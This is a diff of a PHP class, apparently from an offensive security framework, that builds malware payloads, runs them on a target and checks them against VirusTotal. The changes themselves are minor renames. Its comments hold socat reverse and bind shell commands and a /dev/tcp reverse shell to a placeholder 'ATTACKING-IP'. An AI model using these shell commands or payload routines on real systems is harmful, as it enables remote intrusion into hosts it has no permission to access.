@@ -18,8 +18,8 @@ class com4malw extends com4net{
     var $path_java ;
     var $path_go ;
     
-    // Listen : socat TCP-LISTEN:2337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-    // connect : socat FILE:`tty`,raw,echo=0 TCP:192.168.56.102:2337
+    // Listen : $path_remotebin_socat TCP-LISTEN:2337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+    // connect : $path_remotebin_socat FILE:`tty`,raw,echo=0 TCP:192.168.56.102:2337
     
     function __construct(){
         // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
@@ -790,7 +790,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (!file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($target);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($target);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","java -jar $this->file_path ");
         return $this;
     }
@@ -806,7 +806,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","python $this->file_path ");
         return $this; // 1 / 53
     }
@@ -818,7 +818,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","python $this->file_path ");
         return $this;
     }
@@ -830,7 +830,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php $this->file_path ");
         return $this;
     }
@@ -848,7 +848,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php -f $this->file_path ");
         return $this;
     }
@@ -860,7 +860,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
         $this->file_file2virus2vt();
-        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
+        //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php $this->file_path ");
         return $this;
     }
@@ -888,7 +888,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $this->titre("Netcat Backdoor");
         $this->ssTitre("Backdoor TCP avec netcat MODE bind");
         // tcpbind 8080 $shell -i
-        // socat -,raw,echo=0 TCP:target:port,bind=:61040
+        // $path_remotebin_socat -,raw,echo=0 TCP:target:port,bind=:61040
         
         // exec $shell 0&0 2>&0
         // 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
